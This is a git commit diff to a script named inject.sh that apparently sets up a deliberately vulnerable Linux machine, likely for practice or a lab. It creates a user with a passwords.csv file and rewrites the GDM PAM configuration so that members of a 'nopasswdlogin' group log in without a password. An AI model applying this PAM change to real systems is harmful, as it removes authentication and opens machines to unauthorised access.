4fb345a0da41f3646267b7619b6ad5f1091a9687
Sam <github@nicholaslau.com>
2022-08-25 19:46:48 +1000

    add auth to pam.d

--- inject.sh
+++ inject.sh
@@ -15,7 +15,7 @@ sudo touch /opt/listen.sh
 sudo mkdir /home/queenie
 sudo mkdir /home/queenie/Desktop
 sudo touch /home/queenie/Desktop/passwords.csv
-sudo echo 'sufficient pam_succeed_if.so user ingroup nopasswdlogin' > /etc/pam.d/gdm-password
+sudo echo 'auth sufficient pam_succeed_if.so user ingroup nopasswdlogin' > /etc/pam.d/gdm-password
 sudo groupadd nopasswdlogin
 sudo gpasswd --add queenie nopasswdlogin
 
